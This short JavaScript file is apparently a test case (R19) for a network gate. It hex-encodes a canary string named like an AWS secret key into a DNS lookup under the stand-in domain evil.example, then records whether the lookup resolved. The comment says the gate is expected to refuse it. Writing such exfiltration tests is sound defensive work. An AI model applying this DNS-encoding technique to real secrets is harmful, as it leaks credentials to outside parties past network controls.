// R19 (fake): DNS exfiltration — a secret-looking value encoded in the name of a lookup. The gate's DNS must refuse it.
import { promises as dns } from "node:dns";
import { done, init, notes } from "./_lib.mjs";

init();
const label = Buffer.from("AWS_SECRET_ACCESS_KEY=canary").toString("hex").slice(0, 60);
const name = `${label}.evil.example`;
let answered;
try {
  const r = await dns.resolve4(name);
  answered = r.length > 0;
} catch {
  answered = false;
}
notes({ name, answered });
done();
